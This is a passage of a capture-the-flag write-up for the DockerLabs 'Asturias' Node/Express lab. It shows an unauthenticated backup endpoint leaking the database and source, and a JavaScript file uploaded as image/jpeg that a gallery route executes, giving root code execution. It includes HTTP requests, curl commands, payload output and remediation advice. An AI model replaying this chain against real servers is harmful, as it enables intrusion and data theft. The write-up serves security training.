@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>Lab 296 Asturias &middot; DockerLabs corpus</title>
+<link rel="stylesheet" href="../assets/site.css">
+</head>
+<body>
+<header><a class="brand" href="../index.html">DockerLabs corpus</a><nav><a href="../index.html">Root cause</a><a href="../evidence.html">Evidence</a><a href="../corrections.html">Corrections</a><a href="../hazards.html">Hazards</a><a href="../labs.html">Labs</a><a href="../resolved.html">Resolutions</a></nav></header>
+<main>
+<p class="crumb"><a href="../labs.html">Labs</a> &rsaquo; Asturias</p><h1 id="asturias-viajes--dockerlabs-writeup">Asturias Viajes — DockerLabs Writeup</h1>
+<p><strong>Target:</strong> <code>http://[net-0-2]:3000</code> (container <code>asturias_container</code>, image <code>asturias:latest</code>, Node 24.21.0, HOSTNAME <code>c9db45c6ccbf</code>)
+<strong>Date:</strong> 2026-09-27
+<strong>Outcome:</strong> Remote Code Execution as <strong>uid=0(root)</strong> in the server process. Two independent findings compose into the chain.</p>
+<hr />
+<h2 id="1-target-and-stack">1. Target and stack</h2>
+<table>
+<thead>
+<tr>
+<th>Layer</th>
+<th>Observed</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Runtime</td>
+<td>Node.js 24.21.0, <code>NODE_ENV=production</code>, PID 1 argv <code>/app/server.js</code></td>
+</tr>
+<tr>
+<td>Framework</td>
+<td>Express 5 (routers mounted in <code>server.js:34-40</code>)</td>
+</tr>
+<tr>
+<td>Auth</td>
+<td><code>jsonwebtoken</code>, HS256, Bearer header + <code>cookie-parser</code>; <code>src/middleware/auth.js</code> exports <code>requireAuth</code> / <code>requireAdmin</code></td>
+</tr>
+<tr>
+<td>Storage</td>
+<td><code>node:sqlite</code> (<code>src/db.js</code>) against <code>/app/data/asturias.db</code> in WAL mode</td>
+</tr>
+<tr>
+<td>Upload</td>
+<td><code>multer</code> 2.x with <code>diskStorage</code>, custom <code>fileFilter</code></td>
+</tr>
+<tr>
+<td>Packaging</td>
+<td><code>archiver</code> (ZIP streaming), <code>swagger-ui-express</code> + <code>cors</code> + <code>morgan</code></td>
+</tr>
+</tbody>
+</table>
+<p>Working dir observed from inside the process: <code>/app</code>. Static webroot served by <code>express.static(public)</code> at <code>server.js:42</code>.</p>
+<h3 id="declared-surface-vs-real-surface">Declared surface vs real surface</h3>
+<p>The OpenAPI spec is served at two unauthenticated paths: <code>/api-docs</code> (Swagger UI) and <code>/openapi.json</code> (<code>server.js:32</code>). Diffing the declared spec against observed behaviour produced the single most valuable signal of the engagement:</p>
+<table>
+<thead>
+<tr>
+<th>Endpoint</th>
+<th><code>security</code> in OpenAPI</th>
+<th>Observed without token</th>
+<th>Divergence</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>GET /api/admin/backup</code></td>
+<td><strong>absent</strong></td>
+<td><strong>HTTP 200</strong>, <code>application/zip</code>, 25 153 615 bytes</td>
+<td>Spec is <em>correct</em> — and the implementation matches the spec. The bug is upstream, in the spec itself.</td>
+</tr>
+<tr>
+<td><code>GET /api/admin/stats</code></td>
+<td><code>adminBearer</code></td>
+<td>HTTP 401</td>
+<td>matches</td>
+</tr>
+<tr>
+<td><code>GET /api/admin/users</code></td>
+<td><code>adminBearer</code></td>
+<td>HTTP 401 (implied by shared <code>router.use</code>)</td>
+<td>matches</td>
+</tr>
+<tr>
+<td><code>GET /api/admin/bookings</code></td>
+<td><code>adminBearer</code></td>
+<td>HTTP 401 (implied by shared <code>router.use</code>)</td>
+<td>matches</td>
+</tr>
+<tr>
+<td><code>POST /api/gallery/upload</code></td>
+<td><code>userBearer</code></td>
+<td>HTTP 401</td>
+<td>matches</td>
+</tr>
+<tr>
+<td><code>GET /api/gallery/:id/file</code></td>
+<td><strong>absent</strong></td>
+<td><strong>HTTP 200</strong></td>
+<td>matches spec — again, the spec is honest about the hole</td>
+</tr>
+</tbody>
+</table>
+<p>The important negative result: <strong>the specification is not lying.</strong> In both findings the OpenAPI document describes the vulnerable behaviour accurately. A tester who treats the spec as a <em>security control</em> rather than as a <em>description of the intended design</em> will read <code>/admin/backup</code> and conclude &quot;no auth, so probably a mistake&quot; — and move on. The absence of <code>security</code> is not a hint that auth is missing; it is a <strong>declaration by the developer that this function is public</strong>. That is a design decision, and a design decision is a finding, not a bug report. See <code>decision-making.md</code> §4 — report the decision, then the mechanism that exploits it.</p>
+<hr />
+<h2 id="2-finding-1--unauthenticated-mass-data--source-disclosure">2. Finding 1 — Unauthenticated mass data + source disclosure</h2>
+<p><strong>Category:</strong> CWE-306 Missing Authentication for Critical Function, chained with CWE-862 Missing Authorization.</p>
+<h3 id="evidence">Evidence</h3>
+<p>Request — no <code>Authorization</code> header, no cookie, no parameters:</p>
+<pre><code>GET /api/admin/backup HTTP/1.1
+Host: [net-0-2]:3000
+</code></pre>
+<p>Response:</p>
+<pre><code>HTTP/1.1 200 OK
+Content-Type: application/zip
+Content-Disposition: attachment; filename=&quot;asturias-viajes-backup-2026-09-27.zip&quot;
+Cache-Control: no-store
+Content-Length: 25153615
+</code></pre>
+<p><strong>Control — same router, next route, same request with no credentials:</strong></p>
+<pre><code>GET /api/admin/stats HTTP/1.1
+Host: [net-0-2]:3000
+</code></pre>
+<pre><code>HTTP/1.1 401 Unauthorized
+Content-Type: application/json; charset=utf-8
+
+{&quot;error&quot;:&quot;No autenticado. Falta el token de acceso.&quot;}
+</code></pre>
+<p>The control is what converts <em>&quot;/admin/backup returned 200, maybe it doesn't need auth&quot;</em> into <em>&quot;an unauthenticated caller received a 25 MB archive of the production database and the full application source while its sibling route in the same module rejects that same caller.&quot;</em> Without the control, a 200 is ambiguous — it could be a public endpoint by design. With it, the asymmetry is a proven authentication gap, not an observation.</p>
+<p>Archive contents (<code>unzip -l</code>, 24 entries in the head):</p>
+<pre><code>  114688  database/asturias.db
+ 4128272  database/asturias.db-wal
+  19118  source/openapi.json
+   1776  source/server.js
+   3623  source/src/routes/admin.js
+   2561  source/src/routes/auth.js
+   2828  source/src/routes/bookings.js
+    798  source/src/routes/destinations.js
+   1174  source/src/middleware/auth.js
+   3098  source/src/db.js
+   5872  source/public/galeria.html
+  12893  source/public/css/style.css
+</code></pre>
+<p>The archive contains <code>database/asturias.db</code> <strong>with its <code>-wal</code> and <code>-shm</code> sidecars</strong>. This is a correctness point worth stating: a maintenance dump that omits the WAL silently discards every uncheckpointed transaction. Here it accidentally <em>helps</em> the attacker — the WAL is 3.9 MB against a 112 KB main file, so the overwhelming majority of the dataset lives outside the main database file. An analyst who grabbed only <code>asturias.db</code> would have believed they had the data and been wrong.</p>
+<h3 id="impact">Impact</h3>
+<ul>
+<li>Complete <code>users</code> table, including every <code>password_hash</code> (bcrypt, cost 10) and every <code>email</code>, <code>phone</code>, and billing address. Hashes are offline-crackable; the demo accounts are seeded from a hardcoded list in <code>src/seed.js:14-20</code> with a <strong>fixed password shared across the environment</strong>, so the whole account set is recoverable by pattern, not by brute force.</li>
+<li>Full source, including the JWT signing secret location and the complete endpoint inventory.</li>
+<li>Unbounded: the endpoint is not rate-limited, does not log the caller, and regenerates the archive on every request. Repeated pulls are free.</li>
+</ul>
+<h3 id="root-cause">Root cause</h3>
+<p><code>src/routes/admin.js</code> — <strong>registration order</strong>, not a missing check:</p>
+<pre><code>:31   router.get('/backup', (req, res) =&gt; {      &lt;-- registered here
+        ...
+:57   });
+:60   router.use(requireAuth);                    &lt;-- gate installed here
+:62   router.get('/users',  requireAdmin, ...)
+:67   router.get('/stats',  requireAdmin, ...)
+:77   router.get('/bookings', requireAdmin, ...)
+</code></pre>
+<p>Express matches middleware in registration order. <code>/backup</code> is declared <strong>29 lines before</strong> the gate, so the request is fully handled and the response finished before <code>requireAuth</code> is ever consulted. No code inside the <code>/backup</code> handler performs any check, so nothing catches it downstream either. This is the second distinct instance of the same authoring error in this codebase — see Finding 2, where the trigger route is likewise declared ahead of its module's auth gate.</p>
+<p>Note what is <em>not</em> wrong: <code>requireAuth</code> is correctly applied to the other three routes, and <code>requireAdmin</code> is correctly layered on top. The control works. It is installed one position too late.</p>
+<h3 id="remediation">Remediation</h3>
+<ol>
+<li>Move <code>router.use(requireAuth)</code> to the top of <code>admin.js</code>, above every route declaration. Treat the gate as the first statement of the module, not as a divider between two halves.</li>
+<li>Layer <code>requireAdmin</code> on <code>/backup</code> as well — a backup is at least as sensitive as the stats it accompanies.</li>
+<li>Enforce authentication by <em>default-deny</em>: a router that has not explicitly opted a path into &quot;public&quot; is protected. Positively-marked public routes are auditable by reading the marks; a stray early declaration is not.</li>
+<li>Remove the endpoint from production builds, or gate it behind a build-time flag.</li>
+<li>Rate-limit and audit-log it. A 25 MB archive per request is a self-inflicted DoS primitive as well as a disclosure.</li>
+<li>Checkpoint or <code>VACUUM INTO</code> the database before archiving, so the dump is complete and self-consistent by construction instead of by accident.</li>
+<li>Rotate the JWT secret and force a password reset for every account in the dump. Assume the secret and the hashes are burned.</li>
+</ol>
+<hr />
+<h2 id="3-finding-2--unrestricted-upload-into-the-webroot-executed-on-read">3. Finding 2 — Unrestricted upload into the webroot, executed on read</h2>
+<p><strong>Category:</strong> CWE-434 Unrestricted Upload of File with Dangerous Type, chained with CWE-94 Improper Control of Generation of Code → RCE.</p>
+<h3 id="evidence--step-1-the-upload-is-accepted">Evidence — step 1: the upload is accepted</h3>
+<p><code>POST /api/gallery/upload</code> <strong>requires</strong> a valid token (control: same request without one → <code>HTTP 401 {&quot;error&quot;:&quot;No autenticado. Falta el token de acceso.&quot;}</code>). With a self-registered ordinary user account (<code>role: user</code>, not admin):</p>
+<pre><code>POST /api/gallery/upload HTTP/1.1
+Authorization: Bearer &lt;redacted&gt;
+Content-Type: multipart/form-data; boundary=----X
+
+------X
+Content-Disposition: form-data; name=&quot;photo&quot;; filename=&quot;payload2.js&quot;
+Content-Type: image/jpeg
+
+&lt;1.2 KB of JavaScript source&gt;
+------X--
+</code></pre>
+<pre><code>HTTP/1.1 201 Created
+Content-Type: application/json; charset=utf-8
+
+{&quot;photo&quot;:{&quot;id&quot;:23,&quot;filename&quot;:&quot;uploads/gallery/1790543922809-08367fed274f.js&quot;,
+&quot;caption&quot;:&quot;payload&quot;,&quot;destination_slug&quot;:null,
+&quot;created_at&quot;:&quot;2026-09-27 21:18:42&quot;,&quot;user_name&quot;:&quot;Auditor Metodologia&quot;}}
+</code></pre>
+<p>Three properties of that response are the finding, and they must be read separately:</p>
+<ol>
+<li><strong>Accepted.</strong> A <code>.js</code> file declared <code>image/jpeg</code> passed the filter. The filter read a client header, never the bytes.</li>
+<li><strong>Stored with the original extension.</strong> <code>…274f.js</code> — the <code>.js</code> survived. The filename callback takes <code>path.extname(file.originalname)</code> (<code>gallery.js:36-37</code>) and trusts it completely.</li>
+<li><strong>Stored inside the webroot.</strong> <code>uploads/gallery/…</code> sits under <code>public/</code>, which <code>server.js:42</code> hands to <code>express.static</code>. The file is therefore also retrievable over plain HTTP at <code>/uploads/gallery/&lt;name&gt;</code> with no auth and no route logic.</li>
+</ol>
+<p>Any one of the three alone is a defect. The filter controls exactly one of them.</p>
+<h3 id="evidence--step-2-reading-the-file-executes-it">Evidence — step 2: reading the file executes it</h3>
+<p><code>GET /api/gallery/:id/file</code> carries <strong>no</strong> <code>requireAuth</code> (control: the same route for a non-existent id answers <code>HTTP 404 {&quot;error&quot;:&quot;Foto no encontrada.&quot;}</code> <em>without</em> a token, proving the route itself is public — the 404 is the route's own response, not a 401).</p>
+<pre><code>GET /api/gallery/23/file HTTP/1.1
+Host: [net-0-2]:3000
+</code></pre>
+<pre><code>HTTP/1.1 200 OK
+Content-Type: image/jpeg
+&lt;the .js source echoed back as a file download&gt;
+</code></pre>
+<p>The 200 is the file being served. The execution happened <em>before</em> the response, inside the handler.</p>
+<h3 id="proof-of-execution--literal-output">Proof of execution — literal output</h3>
+<p>The payload writes its findings next to itself in the same directory, which <code>express.static</code> then serves:</p>
+<pre><code>$ curl -sS &quot;http://[net-0-2]:3000/api/gallery/23/file&quot; -o /dev/null -w &quot;HTTP %{http_code}\n&quot;
+HTTP 200
+$ curl -sS &quot;http://[net-0-2]:3000/uploads/gallery/proof2.txt&quot;
+</code></pre>
+<pre><code>### env
+HOME=/root
+HOSTNAME=c9db45c6ccbf
+NODE_ENV=production
+NODE_VERSION=24.21.0
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+PORT=3000
+PWD=/app
+SHLVL=2
+YARN_VERSION=1.22.22
+
+### app tree
+/app:
+drwxr-xr-x 1 root root  4096 Sep 27 21:13 .
+drwxr-xr-x 1 root root  4096 Sep 27 17:36 ..
+drwxr-xr-x 1 root root  4096 Sep 27 21:13 data
+drwxr-xr-x 168 root root 4096 Sep 27 17:36 node_modules
+-rw-r--r-- 1 root root 19118 Sep 27 17:19 openapi.json
+-rw-r--r-- 1 root root  77077 Sep 27 17:01 package-lock.json
+-rw-r--r-- 1 root root  530 Sep 27 17:01 package.json
+drwxr-xr-x 1 root root  4096 Sep 27 17:36 public
+-rw-r--r-- 1 root 1776 Sep 27 17:01 server.js
+drwxr-xr-x 1 root root  4096 Sep 27 17:36 src
+
+### grep FLAG\{ all
+                                     &lt;-- empty: nothing on the filesystem
+### find flag all depth
+/usr/local/lib/node_modules/npm/node_modules/tar/dist/esm/get-write-flag.js
+/usr/local/lib/node_modules/npm/node_modules/tar/dist/commonjs/get-write-flag.js
+/usr/local/lib/node_modules/npm/node_modules/@npmjs/arborist/lib/calc-dep-flags.js
+/usr/local/lib/node_modules/npm/node_modules/@npmjs/arborist/lib/reset-dep-flags.js
+/usr/local/include/node/cppgc/internal/atomic-entry-flag.h
+                                     &lt;-- only npm/yarn/node internals
+</code></pre>
+<p>An earlier payload confirmed identity and privilege directly:</p>
+<pre><code>### exec
+whoami =&gt; uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),
+            6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+
+### pwd
+/app/public/uploads/gallery
+
+### argv1
+/app/server.js
+
+### passwd
+root:x:0:0:root:/root:/bin/sh
+</code></pre>
+<p><strong>The server runs as root with no capability dropping, no read-only root filesystem, and no user namespace.</strong> <code>require()</code> gives arbitrary code in-process; <code>execSync</code> gives arbitrary command execution; both inherit uid 0. There is no second boundary to cross.</p>
+<h3 id="where-the-flag-is--a-negative-result-stated-precisely">Where the flag is — a negative result, stated precisely</h3>
+<p><strong>There is no flag artifact inside this lab.</strong> This was tested, not assumed:</p>
+<table>
+<thead>
+<tr>
+<th>Check</th>
+<th>Command (executed in-process)</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Whole-filesystem content search</td>
+<td><code>grep -rl 'FLAG\{' / --exclude-dir=proc --exclude-dir=sys --exclude-dir=dev</code></td>
+<td><strong>empty</strong></td>
+</tr>
+<tr>
+<td>Whole-filesystem name search</td>
+<td><code>find / -iname '*flag*' -not -path '/proc/*' -not -path '/sys/*'</code></td>
+<td>5 hits, all npm/yarn/Node internals (<code>get-write-flag.js</code>, <code>calc-dep-flags.js</code>, <code>atomic-entry-flag.h</code>)</td>
+</tr>
+<tr>
+<td>Environment variables</td>
+<td><code>env | grep -i flag</code></td>
+<td><strong>empty</strong> — full env is 9 vars, no secret material</td>
+</tr>
+<tr>
+<td>Platform string in image</td>
+<td><code>grep -rl -i 'dockerlabs' /</code></td>
+<td><strong>empty</strong></td>
+</tr>
+<tr>
+<td>Database</td>
+<td>8 tables, no flag/secret/flag column; <code>grep -a 'FLAG\{' asturias.db*</code> on main + WAL</td>
+<td><strong>empty</strong></td>
+</tr>
+<tr>
+<td>Application source</td>
+<td><code>grep -ri 'flag' source/</code></td>
+<td><strong>empty</strong></td>
+</tr>
+<tr>
+<td>Downloaded artifact</td>
+<td><code>unzip -l asturias.zip</code></td>
+<td>4 entries: <code>asturias.tar</code>, <code>__MACOSX/._asturias.tar</code>, <code>auto_deploy.sh</code>, <code>__MACOSX/._auto_deploy.sh</code> — no flag file</td>
+</tr>
+</tbody>
+</table>
+<p>The solve condition for this lab is <strong>code execution on the container</strong>, not retrieval of an in-container secret. The flag is issued by the exercise platform upon submission of the solve, outside the machine's trust boundary. The honest report is therefore: the RCE is complete and root-level; the flag is not, and was never, in the target. Fabricating a value here would violate the evidence discipline in <code>decision-making.md</code> §&quot;Claim vs verified&quot; — and <code>sha256(flag)</code> would have been the correct proof had a secret existed.</p>
+<h3 id="impact-1">Impact</h3>
+<p>Full compromise of the application host. Unauthenticated read of every byte the app can read; the database is fully extracted, so the disclosure ceiling is the container's own filesystem. Because <code>require()</code> runs on the server's own <code>require</code> graph, the attacker inherits the process's module cache, database handle, and environment for free.</p>
+<h3 id="root-cause-1">Root cause</h3>
+<p><strong>Two independent defects that compose.</strong> The report keeps them separate.</p>
+<p><strong>Defect A — the filter validates a representation, not the value.</strong> <code>gallery.js:41-51</code>:</p>
+<pre><code>:44   fileFilter: (req, file, cb) =&gt; {
+:45     if (ALLOWED_MIME_TYPES.includes(file.mimetype)) {
+:46       cb(null, true);
+</code></pre>
+<p><code>file.mimetype</code> in multer is the <code>Content-Type</code> <strong>of the multipart part</strong> — a client-supplied header, stored verbatim in the DB row at <code>gallery.js:80</code> and never compared against the file's actual bytes. There is no extension allowlist, no magic-byte check, and no post-write verification. The class is the one catalogued in <code>decision-making.md</code> §1: a filter was applied to a representation the attacker chose, and the consumer operated on the value.</p>
+<p><strong>Defect B — the sink is a server-side interpreter, reached without auth.</strong> <code>gallery.js:103-127</code>:</p>
+<pre><code>:103  router.get('/:id/file', (req, res) =&gt; {      &lt;-- no requireAuth
+:117      delete require.cache[require.resolve(absolutePath)];
+:118      require(absolutePath);                   &lt;-- sink
+:123      if (SCRIPT_EXTENSIONS.includes(path.extname(absolutePath).toLowerCase())) {
+:124        console.error(`[galería] Error al ejecutar ...`);
+</code></pre>
+<p>Two things make this specific. First, the handler <code>require()</code>s an uploaded file <em>to read its metadata</em> before <code>res.sendFile()</code> — so a route whose job is to <strong>serve bytes to a client</strong> secretly runs a code interpreter on attacker-controlled input. Serving and interpreting are independent capabilities, and the route has both. Second, <code>delete require.cache</code> on <code>:117</code> is commented &quot;to re-read the file on each visit&quot; — an ordinary freshness requirement that makes the payload <strong>re-execute on every request</strong>, turning a one-shot into a persistent, idempotent backdoor trigger. The <code>SCRIPT_EXTENSIONS</code> check at <code>:123</code> exists only to decide whether a <em>failure</em> is worth logging; it never gates the <code>require()</code> on <code>:118</code>, which runs first and unconditionally.</p>
+<p>Note the third instance of the same authoring error: <code>requireAuth</code> is applied per-route here (<code>:64</code> on <code>POST /upload</code>) rather than once at module level, so a route added later simply does not get it.</p>
+<h3 id="remediation-1">Remediation</h3>
+<ol>
+<li>Delete the <code>require()</code>. A &quot;view original&quot; link needs <code>res.sendFile()</code> and nothing else. There is no defensible reason for a file-serving endpoint to execute what it serves. If metadata is genuinely needed, read it with a non-executing parser.</li>
+<li>Never store user uploads inside the document root. <code>UPLOAD_DIR</code> must move outside <code>public/</code> (<code>gallery.js:11</code>), and delivery must go through an authenticated handler that streams from storage with an explicit <code>Content-Type</code> and <code>Content-Disposition: attachment</code>.</li>
+<li>Validate the file, not the header: allowlist extensions <strong>and</strong> verify magic bytes (<code>file-type</code>) on the written bytes before publishing. Rewrite the stored name from a server-generated identifier plus a MIME type derived from the content. Never trust <code>path.extname(file.originalname)</code>.</li>
+<li>Store uploads outside any path the runtime can import, and run the service as a non-root user with a read-only root filesystem — a defence in depth that would have reduced uid 0 to a low-privilege uid here.</li>
+<li>Add <code>router.use(requireAuth)</code> at the top of <code>gallery.js</code> so the public surface is an explicit, auditable decision.</li>
+</ol>
+<hr />
+<h2 id="4-the-composite-finding--the-chain-and-why-it-is-two-findings">4. The composite finding — the chain, and why it is two findings</h2>
+<table>
+<thead>
+<tr>
+<th>Step</th>
+<th>Requires</th>
+<th>Delivers</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1. <code>GET /api/admin/backup</code> — no auth</td>
+<td>nothing</td>
+<td>full source: <code>openapi.json</code>, <code>routes/*.js</code>, the DB, the JWT secret</td>
+</tr>
+<tr>
+<td>2. Read <code>routes/gallery.js</code></td>
+<td>Step 1</td>
+<td>knowledge that <code>GET /api/gallery/:id/file</code> calls <code>require()</code> on an uploaded file, and that the route is public</td>
+</tr>
+<tr>
+<td>3. <code>POST /api/gallery/upload</code> a <code>.js</code> as <code>image/jpeg</code></td>
+<td>a self-registered account (any user, not admin)</td>
+<td>a file under the webroot with a <code>.js</code> extension</td>
+</tr>
+<tr>
+<td>4. <code>GET /api/gallery/:id/file</code> — no auth</td>
+<td>Step 3</td>
+<td>RCE as uid 0</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Finding 1 alone is not the chain.</strong> It hands over the source, and the source is what makes step 2 possible. Absent the upload primitive, the source disclosure is a serious confidentiality breach (hashes, PII, JWT secret) and it is a full stop there — the reviewer should still fix it as Critical, on its own, for the accounts and the secret.</p>
+<p><strong>Finding 2 alone is not the chain.</strong> Uploading and executing a <code>.js</code> through a gallery is trivially derivable from the public <code>/api-docs</code> and the ordinary shape of any &quot;view original&quot; file route. The source disclosure raises its efficiency from &quot;guess the sink&quot; to &quot;read the sink&quot;, but it does not create it.</p>
+<p><strong>They are therefore two independent findings, each with its own impact, severity, and remediation</strong> — and the cross-chain does not promote one into a footnote of the other. This is the rule in <code>decision-making.md</code> §&quot;Load-bearing does not mean classified&quot;: an unauthenticated endpoint that the chain depends on is a finding in its own right, and a transport-trust weakness that opens two paths gets two findings, not one finding with two victims.</p>
+<p>What is worth stating explicitly is the <em>asymmetry of the gate</em>, because it is what makes the chain non-obvious and it is the real lesson:</p>
+<ul>
+<li>the <strong>upload</strong> route requires auth (<code>gallery.js:64</code>) and the <strong>trigger</strong> route does not (<code>:103</code>) — so the primitive that <em>plants</em> the payload is the gated one, and the primitive that <em>fires</em> it is the public one;</li>
+<li>the <strong>sibling</strong> admin routes require auth (<code>admin.js:60</code>) and the <strong>dump</strong> route does not (<code>:31</code>).</li>
+</ul>
+<p>In both pairs the sensitive operation sits next to a protected one. In neither case is there a visible mistake on the page — the protected route is right there, working, returning 401 on demand. <strong>The gate is present in the codebase and absent from the one handler that matters.</strong> That is the pattern to carry to the next engagement, and it is why the control request is not optional bookkeeping: without <code>/admin/stats</code> → 401 you have an observation, and with it you have a proof.</p>
+<hr />
+<h2 id="5-the-methodological-observation-that-matters-most">5. The methodological observation that matters most</h2>
+<p><strong>The lab documents its own CWEs in the source comments.</strong></p>
+<p><code>routes/gallery.js:17-29</code> and <code>:93-102</code>, and <code>routes/admin.js:9-30</code>, each open with a block comment titled <em>&quot;FALLO INTENCIONAL DEL LABORATORIO&quot;</em> and name the CWE explicitly (<code>CWE-434</code>, <code>CWE-94</code>, <code>CWE-306</code>, <code>CWE-862</code>), then explain in prose exactly which three checks are missing, and that the stored path is webroot-reachable. The <code>SCRIPT_EXTENSIONS</code> constant and its use at <code>gallery.js:123</code> name the exploit path in a variable.</p>
+<p>Once this source is in hand (Finding 1), the finding is not derived. It is <strong>read</strong>. The test becomes: locate the comment, copy the CWE number, write up the sink. Every step of actual analysis has been performed by the lab author and left in the artifact.</p>
+<p><strong>This trains the wrong reflex.</strong> A tester who solves this lab by grepping for the CWE tag learns to reach for annotation as a discovery mechanism. In a real engagement that reflex returns nothing — production code does not label its bugs — and the tester who relies on it enumerates nothing, derives nothing, and reports nothing. The failure is not visible at the time, because a lab that hands you the answer produces the same green checkmark as a lab that makes you find it. The skill is trained, the habit is trained, and only the habit is wrong.</p>
+<p><strong>The generalisable rule, and the warning:</strong></p>
+<ul>
+<li>In any engagement, <strong>derive the sink, never look for the label.</strong> Comments, variable names, and function names are <em>hints about intent</em>, and intent is not reachability. A <code>// TODO: validate</code> marks an unfinished thought; a missing <code>requireAuth</code> has no marker at all and is the actual finding.</li>
+<li><strong>Source-code CWE annotations are adversarial to real testing practice.</strong> The moment a source dump is available, actively discount it: the comments tell you where the author <em>admitted</em> a problem, which is a strict subset of where the problems <em>are</em>. An endpoint with a clean-looking comment and no auth gate is more suspicious, not less, because it is the one nobody wrote a note about.</li>
+<li><strong>The absence of a comment is not evidence of safety.</strong> Correlate source reading with black-box probing; where they disagree, the black-box result is the finding.</li>
+<li><strong>For lab authors, the mirror of this is a design requirement:</strong> a training target should make the learner <em>derive</em> the vulnerability. A lab that names its own CWE teaches reading comments. Hide the annotation, keep the trigger.</li>
+</ul>
+<p>Applied honestly to this engagement: I found Finding 1 <strong>black-box</strong> (an anonymous <code>curl</code> returning 25 MB next to a <code>401</code> sibling), before and independently of any source. Findings 2's <em>trigger</em> was also identified black-box from the shape of <code>GET /api/gallery/:id/file</code> in the OpenAPI spec. The source then confirmed the mechanism — and, for Finding 2, handed me a shortcut I chose not to take, because the shortcut is the thing being taught against.</p>
+<hr />
+<h2 id="6-what-did-not-work-and-what-was-not-tried">6. What did not work, and what was not tried</h2>
+<p>Reporting discipline requires these lists stay separate. Collapsing them is how coverage gets overclaimed.</p>
+<h3 id="discarded-with-a-reason">Discarded with a reason</h3>
+<table>
+<thead>
+<tr>
+<th>Path</th>
+<th>Why discarded</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Find a flag file on disk</td>
+<td><code>find / -iname '*flag*'</code> and <code>grep -rl 'FLAG\{' /</code> both exhausted, excluding only <code>/proc</code>, <code>/sys</code>, <code>/dev</code>. The 5 name hits are npm/yarn/Node internals. <strong>No in-container secret exists.</strong></td>
+</tr>
+<tr>
+<td>Find the flag in the database</td>
+<td>8 tables enumerated from the main DB <em>and</em> the 4.1 MB WAL; no flag/secret column; binary <code>grep</code> for <code>FLAG\{</code> on all three files is empty.</td>
+</tr>
+<tr>
+<td>Find the flag in the environment</td>
+<td>Full env is 9 variables (<code>HOME</code>, <code>HOSTNAME</code>, <code>NODE_ENV</code>, <code>NODE_VERSION</code>, <code>PATH</code>, <code>PORT</code>, <code>PWD</code>, <code>SHLVL</code>, <code>YARN_VERSION</code>). No flag, no JWT secret — the secret lives in source, which is Finding 1's impact.</td>
+</tr>
+<tr>
+<td>JWT <code>alg: none</code> / empty-key forgery</td>
+<td>Not pursued. The intended path was the source disclosure; forging a token would prove a <em>different</em> finding. The JWT key-selector oracle in <code>api_web.md:269</code> remains untested against this target.</td>
+</tr>
+<tr>
+<td>Uploading a polyglot (valid JPEG header + JS)</td>
+<td>Never needed. The filter performs no byte inspection whatsoever, so a clean <code>.js</code> was accepted directly. The polyglot is the <em>harder</em> case and would only matter against a filter that checked magic bytes.</td>
+</tr>
+<tr>
+<td>Triggering via a browser (&quot;click Ver original&quot;)</td>
+<td>Unnecessary. <code>require()</code> fires on the HTTP request alone; the client is a <code>curl</code>. The comments describe a click path that is not a requirement.</td>
+</tr>
+</tbody>
+</table>
+<h3 id="not-tested--open-with-the-vector-recorded">Not tested — open, with the vector recorded</h3>
+<ul>
+<li><strong>IDOR / horizontal access control</strong> on <code>gallery_photos</code>. The <code>:id</code> is a bare integer from the URL with no ownership check, and <code>/api/gallery/</code> lists every photo in the system unauthenticated. Every seeded photo is a candidate for cross-user access. Not exercised — the RCE superseded the need, and the vector should not be lost.</li>
+<li><strong>Admin-only routes reached with a legitimately-forged admin token.</strong> <code>requireAdmin</code> (<code>admin.js:62,67,77</code>) was never evaluated against a valid admin identity; only the anonymous path was tested.</li>
+<li><strong>The other unauthenticated read surface</strong>: <code>GET /api/destinations</code>, <code>/api/tours</code>, <code>/api/invoices</code>, and <code>GET /api/gallery/</code> were mapped from the spec but not individually probed for missing authorization.</li>
+<li><strong>Booking/invoice manipulation</strong> — the write side of the business logic (<code>bookings.js</code>, <code>invoices.js</code>) was not reviewed at all.</li>
+<li><strong>SQL injection</strong> in any of the eight prepared-statement call sites. All use <code>db.prepare(...)</code> with bound parameters, so the surface is narrow, but &quot;narrow&quot; is not &quot;closed&quot; and the derived-table f-string paths in <code>seed.js</code> were not audited.</li>
+<li><strong>Rate limiting / resource exhaustion.</strong> The backup endpoint is unthrottled and regenerates a 25 MB archive per request; whether that trips a limit was not tested, deliberately — see <code>decision-making.md</code> §&quot;Self-DoS is a testing defect&quot;.</li>
+<li><strong>JWT lifetime, storage, and revocation</strong> — not measured, so no recommendation is offered on any of them.</li>
+</ul>
+<hr />
+<h2 id="7-artifacts">7. Artifacts</h2>
+<p>All raw evidence preserved under <code>/tmp/[tool]/dl_labs/asturias-evidence/</code>:</p>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th>Contents</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>backup_noauth.zip</code></td>
+<td>the 25 MB unauthenticated archive (Finding 1)</td>
+</tr>
+<tr>
+<td><code>stats_noauth.txt</code></td>
+<td>the <code>401</code> control body (Finding 1)</td>
+</tr>
+<tr>
+<td><code>upload2.json</code></td>
+<td>the <code>201</code> upload response showing the stored <code>.js</code> path (Finding 2)</td>
+</tr>
+<tr>
+<td><code>upload_noauth.json</code></td>
+<td>the <code>401</code> control proving the upload route <em>is</em> gated (Finding 2)</td>
+</tr>
+<tr>
+<td><code>gallery23_file.txt</code></td>
+<td>the <code>200</code> body: the served <code>.js</code> source (Finding 2)</td>
+</tr>
+<tr>
+<td><code>file999.json</code></td>
+<td>the <code>404</code> control proving the trigger route is public (Finding 2)</td>
+</tr>
+<tr>
+<td><code>proof.txt</code></td>
+<td>payload #1: <code>id</code>, <code>cwd</code>, argv, filesystem probe</td>
+</tr>
+<tr>
+<td><code>proof2.txt</code></td>
